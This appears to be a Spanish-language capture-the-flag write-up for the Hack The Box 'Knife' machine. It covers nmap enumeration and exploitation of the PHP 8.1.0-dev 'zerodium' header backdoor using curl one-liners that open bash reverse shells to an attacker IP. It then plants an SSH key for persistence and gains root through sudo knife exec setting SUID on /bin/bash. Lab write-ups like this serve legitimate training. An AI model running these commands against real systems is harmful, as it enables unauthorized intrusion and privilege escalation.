# KNIFE MACHINE

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/1.png)

## INDEX

- [[#ENUMERACION|ENUMERACION]]
- [[#EXPLOTACION|EXPLOTACION]]
	- [[#FORMAS DE HACER BANNER GRABBING|FORMAS DE HACER BANNER GRABBING]]
- [[#ELEVACION DE PRIVILEGIOS|ELEVACION DE PRIVILEGIOS]]
	- [[#OPCION 2|OPCION 2]]
- [[#NOTA|NOTA]]


## ENUMERACION

Vemos que puertos abiertos tiene

```
nmap -p- --opent -T5 -n -v 10.129.112.108 -oG allPorts
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/2.png)

vamos a enumerar los servicios:

```
nmap -p22,80 -sC -sV 10.129.112.108 -oN targeted
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/3.png)

tiene el ssh que debe ser para conectarse en un futuro y el puerto 80 que es una pagina web, veamos que hay:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/4.png)

Esta pagina es muy interesante pues con wfuzz y gobuster no hemos logrado identificar subdominios o directorios. La pagina no utiliza ningun framework o CMS. Parecia no tener nada pero ahi es cuando se aprende algo y es el uso de una enumeracion con pinzas.

Wappalyzer nos muestra estas tecnologias:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/5.png)

vemos PHP 8.1.0 y apache 2.4.41 se va con lo que se tiene. Vamos a hacer un banner grabbing a la pagina para ver que informacion nos puede mostrar que normalmente cuando se encuentra algo con wfuzz la obviamos.

## EXPLOTACION

Hicimos un banner grabbing a la pagina para ver si nos detalla algua tecnologia:

### FORMAS DE HACER BANNER GRABBING

```
curl -I 10.129.112.108

-I es solo para mostrar headres
```

```
wget -q -S 10.129.112.108

-q para desactivar la salida del wget
-S para mostrar headers
```

```
whatweb http://10.129.112.108
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/6.png)

vemos las versiones de las tecnologias que enumeramos mas un detalle, la version de PHP es la 8.1.0-dev que eso no mostraba el wappalyzer.

Vamos a buscar algo con esa version de PHP. Tanto buscar di con este repositorio:

[https://github.com/flast101/php-8.1.0-dev-backdoor-rce](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)

Mediante la adicion de una cabecera "User-Agentt" (con doble t) le indicamos la palabra 'zerodium' y despues una instruccion en codigo php, nos lo interpreta.

Mediante el codigo del ese repositorio me guie para enviar la cabecera:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/7.png)

vemos que la cabecera tiene el valor de zerodiumsystem();, esto es porque en php puedes ejecutar comandos del sistema de diferentesformas entre ellas con system():

```
exec() -> ejecuta un programa externo
shell_exec() -> devuelve la salida como una cadena
system() -> muestra la salida como es
```

podemos usar el script del repositorio o curl para mandar esta cabecera, vamos a usar curl para mandarnos una bash a nosotros. Estaremos escuchando en el puerto 4242:

```
curl -i -H "User-Agentt: zerodiumsystem('/bin/bash -c \"bash -i >& /dev/tcp/10.10.16.30/4242 0>&1\"');" 10.129.112.108

-H para enviar headers
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/8.png)

vemos que entramos como james.

Tambien podriamos hacer:

```
curl -i -H "User-Agentt: zerodiumexec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.16.30/4242 0>&1\"');" 10.129.112.108

curl -i -H "User-Agentt: zerodiumshell_exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.16.30/4242 0>&1\"');" 10.129.112.108
```

Ya que estas funciones nos permiten ejecutar comandos, ya podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/9.png)

si vemos que en la misma ruta se tiene el directorio oculto .ssh podemos conectarnos por ssh con su id_rsa:

```
ls -la
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/10.png)

nosotros somos los propietarios, ingresamos a la carpeta:

```
cd .ssh
ls
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/11.png)

vemos unas llaves publicas ya creadas, podemos crear otras y poner una contraseña que sepamos:

```
ssh-keygen

<enter>

overwrite <yes>

passphrase <algo que nos acordemos> 12345
repeat passphrase <12345>

```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/12.png)

con eso creamos otra identidad RSA para ssh, lo sobrescribimos la existente. Vemos que tenemos 2 archivos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/13.png)

una es una clave publica y otra privada, vamos a crear un archivo llamado **authorized_keys** donde vamos a agregar la clave publica. Este archivo va a dejar autorizar a todo aquel que proporcione su clave par (privada) a la hora de autenticarse.

```
touch authorized_keys

cat ad_rsa.pub

echo "id_rsa.pub output" > authorized_keys
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/14.png)

ahora vamos a copiarnos a nuestra equipo kali en un archivo llamado id_rsa la clave privada y le otorgaremos el permiso 600:

```
chmod 600 id_rsa
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/15.png)

y nos autenticaremos como el usuario james a la maquina pero en lugar de contraseña le vamos a proporcionar nuestra clave privada:

```
ssh -i id_rsa james@10.129.112.108
<enter>
<colocamos el passphrase>
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/16.png)

ya estamos como james a traves de ssh.


## ELEVACION DE PRIVILEGIOS

vemos que puede ejecutar como sudo este usuario:

```
sudo -l
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/17.png)

vemos que puede ejecutar **/usr/bin/knife** la verdad no sabia que es esto por lo que google nos ayuda bastante busque "/usr/bin/knife linux" en google y el primer enlace mostraba una documentacion de un programa.

[https://docs.chef.io/workstation/knife_setup/](https://docs.chef.io/workstation/knife_setup/)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/18.png)

Y al parecer chef es una herramienta de Devops.

Vi y en la foto muestra que se tiene que configurar un archivo de configuracion con extension rb por lo que puede deducir que interpreta el lenguaje ruby.

Bueno la idea es escalar privilegios asi que vamos a ver si knife puede ejecutar algun comando en ruby, asi lo busque en gogle y encontré esto:

[https://docs.chef.io/workstation/knife_exec/](https://docs.chef.io/workstation/knife_exec/)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/19.png)

Es posible ejecutar un script en ruby y como lo puede ejecutar el sudo podemos ver como ejecutar comandos de sistema en ruby.

En este caso al poder ejecutar un comando como sudo (root) se puede realizar la escalacion de varias formas pero lo que haremos es colocar el permiso SUID a /bin/bash.

creamos un archivo en ruby y le comocamos esto:

```
system("chmod 4755 /bin/bash")
```

con syste podemos ejecutar comandos a nivel de sistema en ruby, una vez ejecutado esto solo seria hacer un /bin/bash -p y seriamos root:

```
echo 'system("chmod 4755 /bin/bash")' > test.rb

sudo /usr/bin/knife exec test.rb

/bin/bash -p
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/KNIFE/images/20.png)

### OPCION 2

creamos un script en ruby que directamente nos muestre la flag

```
echo 'system("cat /root/root.txt")' > test.rb

sudo /usr/bin/knife exec test.rb

```
 
 ## NOTA
 
 ya como root podemos aplicar lo del id_rsa ya que se tiene el directorio .ssh en la ruta /root